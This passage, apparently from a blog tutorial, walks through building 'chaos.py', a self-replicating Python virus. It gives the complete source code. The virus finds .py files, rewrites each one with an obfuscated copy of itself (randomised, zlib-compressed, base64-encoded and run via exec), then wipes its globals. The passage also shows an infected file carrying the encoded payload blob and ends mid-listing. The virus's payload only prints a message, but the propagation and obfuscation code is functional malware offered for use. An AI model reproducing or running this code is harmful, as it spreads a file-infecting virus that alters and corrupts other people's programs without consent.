<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span>    new_virus_code<span style=color:#ff79c6>.</span>append(line <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span>  obscured_virus_code <span style=color:#ff79c6>=</span> obscure(<span style=color:#8be9fd;font-style:italic>bytes</span>(<span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>.</span>join(new_virus_code), <span style=color:#f1fa8c>&#39;utf-8&#39;</span>))
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span>  <span style=color:#ff79c6>return</span> obscured_virus_code
</code></pre></div><p>Obviously, when you obscure your virus compressing it and encoding it in base64 the code is not executable anymore, so you will have to transform it to the original state before executing it. This will be done in the <code>infect</code> method, by using the exec statement like this:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span>def infect<span style=color:#ff79c6>(</span>file, virus_code<span style=color:#ff79c6>)</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span>  <span style=color:#6272a4># infect a single file. The routine opens the file and if it&#39;s not been infected yet, infect the file with a custom version of the virus code</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span>  <span style=color:#8be9fd;font-style:italic>hash</span> <span style=color:#ff79c6>=</span> hashlib.md5<span style=color:#ff79c6>(</span>file.encode<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;utf-8&#34;</span><span style=color:#ff79c6>))</span>.hexdigest<span style=color:#ff79c6>()</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span>  <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>data:<span style=color:#ff79c6>=</span>get_content_if_infectable<span style=color:#ff79c6>(</span>file, <span style=color:#8be9fd;font-style:italic>hash</span><span style=color:#ff79c6>))</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span>    <span style=color:#8be9fd;font-style:italic>obscured_virus_code</span> <span style=color:#ff79c6>=</span> transform_and_obscure_virus_code<span style=color:#ff79c6>(</span>virus_code<span style=color:#ff79c6>)</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span>    <span style=color:#8be9fd;font-style:italic>viral_vector</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;exec(\&#34;import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode(&#34;</span>+str<span style=color:#ff79c6>(</span>obscured_virus_code<span style=color:#ff79c6>)</span>+<span style=color:#f1fa8c>&#34;)))\&#34;)&#34;</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span>    with open<span style=color:#ff79c6>(</span>file, <span style=color:#f1fa8c>&#34;w&#34;</span><span style=color:#ff79c6>)</span> as infected_file:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span>      infected_file.write<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;\n# begin-&#34;</span>+ <span style=color:#8be9fd;font-style:italic>hash</span> + <span style=color:#f1fa8c>&#34;\n&#34;</span> + viral_vector + <span style=color:#f1fa8c>&#34;\n# end-&#34;</span> + <span style=color:#8be9fd;font-style:italic>hash</span> + <span style=color:#f1fa8c>&#34;\n&#34;</span><span style=color:#ff79c6>)</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span>      infected_file.writelines<span style=color:#ff79c6>(</span>data<span style=color:#ff79c6>)</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span>
</code></pre></div><p>The complete source code of our new virus could be similar to this:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1</span><span style=color:#6272a4># ################</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2</span><span style=color:#6272a4># chaos.py</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3</span><span style=color:#6272a4># a Python virus</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4</span><span style=color:#6272a4># ###############</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6</span><span style=color:#6272a4># begin-78ea1850f48d1c1802f388db81698fd0</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8</span><span style=color:#ff79c6>import</span> base64
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9</span><span style=color:#ff79c6>import</span> glob
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10</span><span style=color:#ff79c6>import</span> hashlib
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11</span><span style=color:#ff79c6>import</span> inspect
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12</span><span style=color:#ff79c6>import</span> os
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13</span><span style=color:#ff79c6>import</span> random
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14</span><span style=color:#ff79c6>import</span> zlib
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_content_of_file</span>(file):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17</span>  data <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>None</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18</span>    <span style=color:#6272a4># return the content of a file</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19</span>  <span style=color:#ff79c6>with</span> <span style=color:#8be9fd;font-style:italic>open</span>(file, <span style=color:#f1fa8c>&#34;r&#34;</span>) <span style=color:#ff79c6>as</span> my_file:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20</span>    data <span style=color:#ff79c6>=</span> my_file<span style=color:#ff79c6>.</span>readlines()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22</span>  <span style=color:#ff79c6>return</span> data
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23</span>  
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_content_if_infectable</span>(file, <span style=color:#8be9fd;font-style:italic>hash</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25</span>    <span style=color:#6272a4># return the content of a file only if it hasn&#39;t been infected yet</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26</span>  data <span style=color:#ff79c6>=</span> get_content_of_file(file)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28</span>  <span style=color:#ff79c6>for</span> line <span style=color:#ff79c6>in</span> data:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29</span>    <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>hash</span> <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30</span>      <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>None</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32</span>  <span style=color:#ff79c6>return</span> data
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>obscure</span>(data: <span style=color:#8be9fd;font-style:italic>bytes</span>) <span style=color:#ff79c6>-&gt;</span> <span style=color:#8be9fd;font-style:italic>bytes</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35</span>    <span style=color:#6272a4># obscure a stream of bytes compressing it and encoding it in base64</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36</span>    <span style=color:#ff79c6>return</span> base64<span style=color:#ff79c6>.</span>urlsafe_b64encode(zlib<span style=color:#ff79c6>.</span>compress(data, <span style=color:#bd93f9>9</span>))
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>transform_and_obscure_virus_code</span>(virus_code):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39</span>    <span style=color:#6272a4># transforms the virus code adding some randomic contents, compressing it and converting it in base64</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40</span>  new_virus_code <span style=color:#ff79c6>=</span> []
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41</span>  <span style=color:#ff79c6>for</span> line <span style=color:#ff79c6>in</span> virus_code:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42</span>    new_virus_code<span style=color:#ff79c6>.</span>append(<span style=color:#f1fa8c>&#34;# &#34;</span><span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>str</span>(random<span style=color:#ff79c6>.</span>randrange(<span style=color:#bd93f9>1000000</span>))<span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43</span>    new_virus_code<span style=color:#ff79c6>.</span>append(line <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45</span>  obscured_virus_code <span style=color:#ff79c6>=</span> obscure(<span style=color:#8be9fd;font-style:italic>bytes</span>(<span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>.</span>join(new_virus_code), <span style=color:#f1fa8c>&#39;utf-8&#39;</span>))
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46</span>  <span style=color:#ff79c6>return</span> obscured_virus_code
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>find_files_to_infect</span>(directory <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;.&#34;</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49</span>  <span style=color:#6272a4># find other files that can potentially be infected </span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50</span>  <span style=color:#ff79c6>return</span> [file <span style=color:#ff79c6>for</span> file <span style=color:#ff79c6>in</span> glob<span style=color:#ff79c6>.</span>glob(<span style=color:#f1fa8c>&#34;*.py&#34;</span>)]
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>summon_chaos</span>():
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53</span>  <span style=color:#6272a4># the virus payload</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54</span>  <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;We are sick, fucked up and complicated</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>We are chaos, we can&#39;t be cured&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>infect</span>(file, virus_code):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57</span>  <span style=color:#6272a4># infect a single file. The routine open the file and if it&#39;s not been infected yet, infect the file with a custom version of the virus code</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58</span>  <span style=color:#8be9fd;font-style:italic>hash</span> <span style=color:#ff79c6>=</span> hashlib<span style=color:#ff79c6>.</span>md5(file<span style=color:#ff79c6>.</span>encode(<span style=color:#f1fa8c>&#34;utf-8&#34;</span>))<span style=color:#ff79c6>.</span>hexdigest()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60</span>  <span style=color:#ff79c6>if</span> (data<span style=color:#ff79c6>:=</span>get_content_if_infectable(file, <span style=color:#8be9fd;font-style:italic>hash</span>)):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61</span>    obscured_virus_code <span style=color:#ff79c6>=</span> transform_and_obscure_virus_code(virus_code)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62</span>    viral_vector <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;exec(</span><span style=color:#f1fa8c>\&#34;</span><span style=color:#f1fa8c>import zlib</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>nimport base64</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>nexec(zlib.decompress(base64.urlsafe_b64decode(&#34;</span><span style=color:#ff79c6>+</span><span style=color:#8be9fd;font-style:italic>str</span>(obscured_virus_code)<span style=color:#ff79c6>+</span><span style=color:#f1fa8c>&#34;)))</span><span style=color:#f1fa8c>\&#34;</span><span style=color:#f1fa8c>)&#34;</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64</span>    <span style=color:#ff79c6>with</span> <span style=color:#8be9fd;font-style:italic>open</span>(file, <span style=color:#f1fa8c>&#34;w&#34;</span>) <span style=color:#ff79c6>as</span> infected_file:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65</span>      infected_file<span style=color:#ff79c6>.</span>write(<span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c># begin-&#34;</span><span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>hash</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span> <span style=color:#ff79c6>+</span> viral_vector <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c># end-&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>hash</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66</span>      infected_file<span style=color:#ff79c6>.</span>writelines(data)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_virus_code</span>():
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69</span>  <span style=color:#6272a4># open the current file and returns the virus code, that is the code between the</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70</span>  <span style=color:#6272a4># begin-{hash} and the end-{hash} tags</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71</span>  virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>False</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72</span>  virus_code <span style=color:#ff79c6>=</span> []
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74</span>  virus_hash <span style=color:#ff79c6>=</span> hashlib<span style=color:#ff79c6>.</span>md5(os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>basename(__file__)<span style=color:#ff79c6>.</span>encode(<span style=color:#f1fa8c>&#34;utf-8&#34;</span>))<span style=color:#ff79c6>.</span>hexdigest()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75</span>  code <span style=color:#ff79c6>=</span> get_content_of_file(__file__)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77</span>  <span style=color:#ff79c6>for</span> line <span style=color:#ff79c6>in</span> code:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78</span>    <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;# begin-&#34;</span> <span style=color:#ff79c6>+</span> virus_hash <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79</span>      virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>True</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81</span>    <span style=color:#ff79c6>if</span> virus_code_on:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82</span>      virus_code<span style=color:#ff79c6>.</span>append(line <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84</span>    <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;# end-&#34;</span> <span style=color:#ff79c6>+</span> virus_hash <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85</span>      virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>False</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86</span>      <span style=color:#ff79c6>break</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88</span>  <span style=color:#ff79c6>return</span> virus_code
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90</span><span style=color:#6272a4># entry point</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92</span><span style=color:#ff79c6>try</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93</span>  <span style=color:#6272a4># retrieve the virus code from the current infected script</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94</span>  virus_code <span style=color:#ff79c6>=</span> get_virus_code()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96</span>  <span style=color:#6272a4># look for other files to infect</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97</span>  <span style=color:#ff79c6>for</span> file <span style=color:#ff79c6>in</span> find_files_to_infect():
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98</span>    infect(file, virus_code)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">100</span>  <span style=color:#6272a4># call the payload</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">101</span>  summon_chaos()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">102</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">103</span><span style=color:#ff79c6>except</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">104</span>  <span style=color:#ff79c6>pass</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">105</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">106</span><span style=color:#ff79c6>finally</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">107</span>  <span style=color:#6272a4># delete used names from memory</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">108</span>  <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>list</span>(<span style=color:#8be9fd;font-style:italic>globals</span>()<span style=color:#ff79c6>.</span>keys()):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">109</span>      <span style=color:#ff79c6>if</span>(i[<span style=color:#bd93f9>0</span>] <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;_&#39;</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">110</span>          exec(<span style=color:#f1fa8c>&#39;del </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#39;</span><span style=color:#ff79c6>.</span>format(i))
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">111</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">112</span>  <span style=color:#ff79c6>del</span> i
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">113</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">114</span><span style=color:#6272a4># end-78ea1850f48d1c1802f388db81698fd0</span>
</code></pre></div><p>Now, let&rsquo;s try this new virus in another directory with the uninfected version of <code>[numbers.py](http://numbers.py)</code> and <code>[hello.py](http://hello.py)</code>, and let&rsquo;s see what happens.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>/playgrounds/python/chaos ❯ python chaos.py                                                                            03:09:52 PM
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>We are sick, fucked up and complicated
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>We are chaos, we can&#39;t be cured
</code></pre></div><p>Executing the virus we have the same behavior as we had before, but our infected files are now a little different than before&mldr; This is <code>[numbers.py](http://numbers.py)</code> :</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span style=color:#6272a4># begin-661bb45509227577d3693829a1e1cb33</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span>exec<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b&#39;eNqVWMty47oRXUtfgdALkxkNC2-AU-Uss8zqVmUxvsWiRNBmLJEqkhqPc-v-expAk5JsOZmoaqwHmo2Dfpw-mDtSWM6MWt-RrXtqu6_GuopZRRtpa7ZjlvJGWFtvLdOFbWq6XoOpKKhldh0-S8YMtev2cOyHiWyr0WkZFhjjtFDzwtO-38afjTF2-fm5Gp_3bVzRtDCsmFfabjy63RRWOKXMsnmlH-OP1moj5h-Hqqv7A6IT0sp54d-ze2WE0iyCVkxxIda1a8iTm8pd302um8q-KZt271L_J_sW4SpBpVyv6mqqyAP5R9-5uLtmUuo1gdcdGdx0GjoyPTuCrkjfkIp4PxESV0KJ9eq1nZ5Jf3Rd2GJDkiHJSDWSw1vY-BsaF5SB8bwnLuaDq-p927kxzYKdKYQymAUutdR2vUIk_kmMqTFw6FX4YgvOBf9w6rYp266BWFdbPPsm5AUjYFRhDf-Fk5K-27-RtiFtyGt3D-XgXEeic1eTNxfTWVhhuF1i-mkGcHsuaBFPWRjFqFqvmn4gPhLgOhw1ApVC2QLcrgCCx-9XvRVGVUtmC1idY7SkUiomuI47CKoKfiOO4FowtNFaWSZDGPvtuDsNLg0gyPZtcmNGvv4tfkJUWkhNMXxoDwEbJ0jnwQcv2EI0D8fBjWPbPfn4QTUT1-36Gr_DUS5aq2CSSht8ItC4mJ-G_Vg1rtxqGZ52qS__fHYecG5IkWXYoaLgGFoF4QGX_lAT9NIIIT6UgKJEyOWPdjiNZfB5_jiXCBdmKZHl8TGUSTAm3phUdTjO2B8c9mu7m8to3NwKASz-cMN0MwhCMs6hGDr3egEO6un773HdckPFdbGc7RC4VApSv3rnJK-O0KN1mtyR5ItPVRrh5v4N_j25lNHwyrIvJHnskrlWNYXK-MxdQHFpr5meGUly4DMoPAx3fX2kuc5CraRJkv-rb7v0epdsQ-5PU_PV3mN6_dEKs9TyDc-RFXShgKdjRUjKIKa-CpoWku_bcCynHgkirdsB3vrhDTAleTJzJMwLINzVXXiI9JD2ITCCr4BqIruqI8feZ7mt9kARW3fmBEwVcJlekH4PbOLzFj5A3vz0yP2fNPlrfnxLsphiXTAuJXIDDDLDAvTxdDj0Xbl7rnrgSsTIgf2ox3guymP1tu-rOsafSuUhHIe2m9Lkn1Ct0Kdju3vZkOa0ewGopyPW5OG4b3cVoH_s0C5stSGvzp818B4JscY8c8qNwT4TnsQCTIxpJNwPPWW14L4g7tDOcwb0gQ-MHwbkNzjG0J8mX1N-ooRzhXh5kIGF70fS9TdIeDO7XB4Jc6kCzOPUHwi03Nj2nSen6w5e5i4EKjDswzzA80Otwkly5J0klGKSZfmz-1m3T26ccGzJAgTAzDpUURAfnrEjhz780mDCEBUm0ODqk6b5f3gMBwFgAzQrWKj25Y9Q6r7S3U-3Sx-TC0Xx-NhdKR74HowC3dZuIdyPvOwXfXy-eFq5ATz7AkHLHpMswd6ygvMYLaNBwHi2-iAjXqOMmJN8KSYol9yLidXVYv46tBOgeOxm4QdEF1Ia-QneroIQfr2DkVR_9WsXlljhShf0s22iaPH5RWPGKGDC1rBnRXKRG0wxjCXOlO-CpcYhYIPXHUutR9Z4P202kXvaEcUKlMTWTa8ueon0oZjhxjuPIfjDH-vP4NM_4w-LP03VUxSdoIKDHDwjLaFRHsjfq_2IdKqoFvbS4jySNKUwZbH0DVfSzHY3uqkf82M1Pee-hLrq4NIyhLQss__dYwyo0ADb4fa3FNbiLSITwOCob2Ag-KRcDc7zyPQsy1BlJUvxxHqZD3IlvCSMFyDm1epD0H4bTg4FIehBpARNrZXo_-qBbwhUKiqvvX06X5lmBc5XYaURZ9hzIX8GGsYRC1TwXzLN4XJUBChb0HIv8Tl4jOGWhQLlrJap9m7sGg4yn2ItgHY32BAwTGW4j0GyYM4eYdBPs1iwVMwpYoWSazDANqFwOOYrGTYbWvfDvddezQDEftk-y0AYd0N7xHuWUSCw39Xu-8ZEWhFUY8ZAkrPYRvu-fwlz-0oC9LhXRGotU6jK5ul-U2rMBGAZ12Y988rHaRnjYUWh8CoEMkoY7eHsQG2EM18OemWVgdCtrkUCyoliuSFyuFwptXY_d-44oYSAIlUA5ViNSAZFAZSMydb-6rCGo3iJs1xImA7kVbu9mxw5jRBv38tjzMfBHUBLxefhymdpjEsbaxG62UseqLc0y1_cG7xhUODGziSk2wvutknb7_R38pcHcl_enxUZj8v-FSbTPWAgf_x5n_uJWE1piyoRigrcoQilBlQHXMzAtJ3litZ2vjRrDjeZ2Dy_8P8E_wH6PJBm&#39;)))&#34;</span><span style=color:#ff79c6>)</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span style=color:#6272a4># end-661bb45509227577d3693829a1e1cb33</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span style=color:#6272a4># numbers.py</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span>import random
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span>random.seed<span style=color:#ff79c6>()</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span style=color:#ff79c6>for</span> _ in range<span style=color:#ff79c6>(</span>10<span style=color:#ff79c6>)</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span>  print <span style=color:#ff79c6>(</span>random.randint<span style=color:#ff79c6>(</span>0,100<span style=color:#ff79c6>))</span>
</code></pre></div><p>and this is</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#6272a4># begin-8d35108ffe2ad173a697734a3e9938e1</span>
